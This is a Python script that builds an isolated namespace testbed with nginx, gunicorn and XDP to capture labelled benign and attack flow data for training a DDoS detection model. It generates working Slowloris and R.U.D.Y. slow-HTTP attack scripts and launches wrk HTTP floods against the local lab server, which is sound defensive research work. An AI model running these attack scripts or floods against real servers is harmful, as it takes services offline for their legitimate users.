#!/usr/bin/env python3
"""Tier-1 T1a (v2) — capture a labelled flow dataset against the REAL deployment.

This supersedes the earlier python-http.server capture. It now stands up the
IDENTICAL server stack used by test_distributed_suite.py — nginx (the protected
nginx.conf: 30 r/s limit_req, 50 conn limit_conn, 5 s slow-timeouts, SSL) in
front of a gunicorn backend — and drives it with legit clients carrying the same
tc-netem profiles (perfect / broadband / mobile_3g / mobile_bad). The forward
flow features XDP records therefore match deployment exactly (closing the
http.server -> nginx train/deploy gap), and — crucially — the training set now
contains LOSSY benign flows labelled benign, so the GRU learns that packet loss
on a real client is still benign (the root cause of the GRU_ONLY lossy FP).

Topology, server startup, netem and legit-traffic cadence are reused verbatim
from the suite (import below) so capture == deployment by construction. No
control_plane daemon runs during capture: we attach XDP ourselves purely to read
flow_map, and the attackers run unmitigated so their flows are recorded cleanly.

Legit profile mix is deliberately BALANCED (equal counts per profile, oversampling
the lossy ones vs. the suite's 30/35/25/10) to give the model ample lossy-benign
training signal.

Run:    sudo ./venv/bin/python capture_testbed_dataset.py
Output: training_data/testbed_flows.csv
"""
import os, sys, time, socket, struct, ctypes, textwrap, subprocess, random, atexit, shutil, tempfile
import pandas as pd
from bcc import BPF

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import test_distributed_suite as S   # exact topology + server stack + netem + legit traffic

SIP        = S.SERVER_IP                 # 10.0.0.1
HTTP_URL   = S.HTTP_URL
NGINX_CONF = S.NGINX_CONF                # the PROTECTED config = deployment
VENV       = S.PYTHON_VENV
PROJ       = S.PROJECT_DIR
SERVER_NS  = S.SERVER_NS
SRV_VETH   = "veth_server"               # server-side veth the daemon attaches XDP to
ACCESS_LOG = "/var/log/nginx/ddos_ml_access.log"
ERROR_LOG  = "/var/log/nginx/error.log"

N_PER_PROFILE = 6                        # 6 each → 24 legit clients, balanced across profiles
PROFILES      = ["perfect", "broadband", "mobile_3g", "mobile_bad"]
N_BOTS        = 6
ATTACK_CAP_PER_POLL = 80                 # keep benign:attack ratio sane
TOTAL         = 170                      # capture seconds (1 poll/s)
OUT           = "training_data/testbed_flows.csv"
# Attack scripts go to a private temporary directory, removed at exit. (Review D12: this
# used to be another session's tmpfs scratchpad, which no longer exists after a reboot,
# so the capture crashed once the topology and the server were already up.)
SCR           = tempfile.mkdtemp(prefix="ddos_capture_")
atexit.register(shutil.rmtree, SCR, ignore_errors=True)
FEATS = ["Init_Win_bytes_forward","Fwd IAT Total","Fwd Header Length","Fwd IAT Max",
         "Fwd Packet Length Max","Fwd IAT Mean","Fwd Packets/s","Total Length of Fwd Packets"]

libc = ctypes.CDLL("libc.so.6", use_errno=True); CLONE_NEWNET = 0x40000000
def enter(fd):
    if libc.setns(fd, CLONE_NEWNET) != 0:
        e = ctypes.get_errno(); raise OSError(e, os.strerror(e))
def ip_str(v): return socket.inet_ntoa(struct.pack("=I", v))

# ───────────────────────── server stack (nginx + gunicorn) ──────────────────────
def start_server():
    """Start gunicorn + the PROTECTED nginx inside server_ns (no control_plane)."""
    subprocess.run(["mkdir", "-p", "/var/log/nginx"], capture_output=True)
    for lf in (ACCESS_LOG, ERROR_LOG):
        open(lf, "w").close()
    if not os.path.isfile("/etc/ssl/certs/nginx-selfsigned.crt"):
        subprocess.run(["openssl","req","-x509","-nodes","-days","365","-newkey","rsa:2048",
            "-keyout","/etc/ssl/private/nginx-selfsigned.key",
            "-out","/etc/ssl/certs/nginx-selfsigned.crt",
            "-subj","/C=PL/ST=Masovian/L=Warsaw/O=PoC/CN=twojadomena.pl"], capture_output=True)
    with open(os.path.join(PROJ, "dummy_app.py"), "w") as f:
        f.write('def app(environ, start_response):\n'
                '    data = b"Backend is running flawlessly!\\n"\n'
                '    start_response("200 OK", [("Content-Type","text/plain"),\n'
                '        ("Content-Length", str(len(data)))])\n'
                '    return iter([data])\n')
    S.run([VENV,"-m","gunicorn","--chdir",PROJ,"--workers","8","--threads","4",
           "-b","0.0.0.0:8080","dummy_app:app"], ns=SERVER_NS, bg=True)
    time.sleep(1.5)
    S.run(["nginx","-c",NGINX_CONF], ns=SERVER_NS, bg=True)
    time.sleep(1.5)
    # readiness probe from a throwaway curl inside the server ns
    for _ in range(20):
        r = S.run(f"curl -s -o /dev/null -w %{{http_code}} --max-time 3 {HTTP_URL}", ns=SERVER_NS)
        if r and r.stdout.strip() in ("200", "429", "503"):
            print(f"[+] nginx+gunicorn up (probe HTTP {r.stdout.strip()})"); return
        time.sleep(0.5)
    print("[!] server readiness probe did not confirm; continuing anyway")

# ───────────────────────── attack scripts (reconnecting, suite-style) ────────────
def write_slow(path, n, dur, body=False):
    verb = "POST" if body else "GET"
    extra = ('s.send("Content-Length: 1000000\\r\\nConnection: keep-alive\\r\\n\\r\\n".encode())'
             if body else 'pass')
    keep = 's.send(b"a")' if body else 's.send(f"X-a: {random.randint(1,9999)}\\r\\n".encode())'
    sleep = 7 if body else 5
    open(path, "w").write(textwrap.dedent(f'''
        import socket, random, time
        TARGET="{SIP}"; PORT=80; N={n}; SLEEP={sleep}; DUR={dur}; socks=[]
        def mk():
            try:
                s=socket.socket(); s.settimeout(4); s.connect((TARGET,PORT))
                s.send(f"{verb} /?r={{random.randint(0,9999)}} HTTP/1.1\\r\\n".encode())
                s.send(f"Host: {{TARGET}}\\r\\n".encode())
                s.send("User-Agent: X\\r\\nAccept-language: en\\r\\n".encode())
                {extra}
                return s
            except: return None
        for _ in range(N):
            s=mk()
            if s: socks.append(s)
        end=time.time()+DUR
        while time.time()<end:
            for s in list(socks):
                try: {keep}
                except: socks.remove(s)
            for _ in range(N-len(socks)):
                s=mk()
                if s: socks.append(s)
            time.sleep(SLEEP)'''))

SLOW8  = f"{SCR}/_cap_slow8.py";  SLOW30 = f"{SCR}/_cap_slow30.py"
RUDY10 = f"{SCR}/_cap_rudy10.py"; RUDY20 = f"{SCR}/_cap_rudy20.py"

def kill_attacks():
    for p in ("wrk","_cap_slow8","_cap_slow30","_cap_rudy10","_cap_rudy20"):
        subprocess.run(["pkill","-9","-f",p], capture_output=True)

# ───────────────────────── build topology (reuse suite helpers) ──────────────────
root_fd = os.open("/proc/self/ns/net", os.O_RDONLY)
S.cleanup_all()
kill_attacks()
S.create_host_bridge()
S.create_server_ns()

legit_nodes, idx = [], 1
for prof in PROFILES:
    for _ in range(N_PER_PROFILE):
        ns, ip = f"legit_{idx}", f"10.0.1.{idx}"; idx += 1
        S.create_client_ns(ns, ip); S.apply_tc(ns, prof)
        legit_nodes.append((ns, ip, prof))
bots = []
for i in range(1, N_BOTS + 1):
    ns, ip = f"bot_{i}", f"10.0.2.{i}"
    S.create_client_ns(ns, ip); bots.append((ns, ip))
print(f"[*] topology: {len(legit_nodes)} legit ({N_PER_PROFILE}/profile), {len(bots)} bots")

start_server()
for p, n, b in ((SLOW8,8,False),(SLOW30,30,False),(RUDY10,10,True),(RUDY20,20,True)):
    write_slow(p, n, 150, body=b)

# attach XDP inside server_ns (device veth_server lives there); read flow_map
enter(os.open(f"/var/run/netns/{SERVER_NS}", os.O_RDONLY))
b = BPF(src_file="xdp_ddos_filter.c")
b.attach_xdp(SRV_VETH, b.load_func("xdp_ddos_mitigation", BPF.XDP), flags=BPF.XDP_FLAGS_SKB_MODE)
flow = b.get_table("flow_map")
print("[*] XDP attached to veth_server; starting legit traffic + attack schedule...")

S.start_legit_traffic(legit_nodes)   # exact deployment cadence per profile

# staggered varied L7 attacks, each ~150 s (labelled by bot IP)
SCHED = [
    (10, lambda: S.run(f"wrk -t2 -c50 -d150s {HTTP_URL}", ns="bot_1", bg=True)),  # HTTP flood (heavy)
    (10, lambda: S.run(f"wrk -t2 -c30 -d150s {HTTP_URL}", ns="bot_2", bg=True)),  # HTTP flood (light)
    (14, lambda: S.run(["python3", SLOW8],  ns="bot_3", bg=True)),                 # Slowloris N=8
    (14, lambda: S.run(["python3", SLOW30], ns="bot_4", bg=True)),                 # Slowloris N=30
    (18, lambda: S.run(["python3", RUDY10], ns="bot_5", bg=True)),                 # R.U.D.Y. N=10
    (18, lambda: S.run(["python3", RUDY20], ns="bot_6", bg=True)),                 # R.U.D.Y. N=20
]

rows, started, prev_pk = [], set(), {}
for t in range(TOTAL):
    for i, (t0, launch) in enumerate(SCHED):
        if t == t0 and i not in started:
            launch(); started.add(i)
    time.sleep(1)
    # snapshot: only flows active since last poll (fwd packets advanced) — the exact
    # unit control_plane evaluates at inference; avoids re-emitting stale flows.
    ben, att = [], []
    for k, v in flow.items():
        key = (k.src_ip, k.src_port, k.dst_port, k.proto)
        pk = v.fwd_packets
        if prev_pk.get(key, 0) >= pk:
            continue
        prev_pk[key] = pk
        sip = ip_str(k.src_ip)
        lab = 0 if sip.startswith("10.0.1.") else (1 if sip.startswith("10.0.2.") else -1)
        if lab < 0:
            continue
        dur = v.last_seen_ns - v.first_seen_ns
        row = [sip, k.src_port, k.dst_port, k.proto,
               v.init_win, dur/1000.0, v.fwd_hdr_bytes, v.iat_max_ns/1000.0,
               v.fwd_pkt_len_max, (dur/1000.0)/(pk-1) if pk > 1 else 0.0,
               pk/(dur/1e9) if dur > 0 else 0.0, v.fwd_payload_bytes, lab, t]
        (ben if lab == 0 else att).append(row)
    if len(att) > ATTACK_CAP_PER_POLL:
        att = random.sample(att, ATTACK_CAP_PER_POLL)
    rows.extend(ben); rows.extend(att)
    if t % 10 == 0:
        print(f"  t={t:3d}s  active benign={len(ben)} attack(capped)={len(att)}  total_rows={len(rows)}")

# teardown
b.remove_xdp(SRV_VETH, flags=BPF.XDP_FLAGS_SKB_MODE)
enter(root_fd)
S.stop_legit_traffic()
kill_attacks()
S.cleanup_all()

cols = ["src_ip","src_port","dst_port","proto"] + FEATS + ["y","poll"]
df = pd.DataFrame(rows, columns=cols)
os.makedirs("training_data", exist_ok=True); df.to_csv(OUT, index=False)
print(f"\n[+] wrote {OUT}: {len(df)} samples  benign={(df.y==0).sum()} attack={(df.y==1).sum()}")
print("    unique benign IPs:", df[df.y==0].src_ip.nunique(),
      "| unique attack IPs:", df[df.y==1].src_ip.nunique())
by_prof = df[df.y==0].groupby(df[df.y==0].src_ip).size()
print(f"    benign flows/IP: min={by_prof.min() if len(by_prof) else 0} "
      f"max={by_prof.max() if len(by_prof) else 0}")
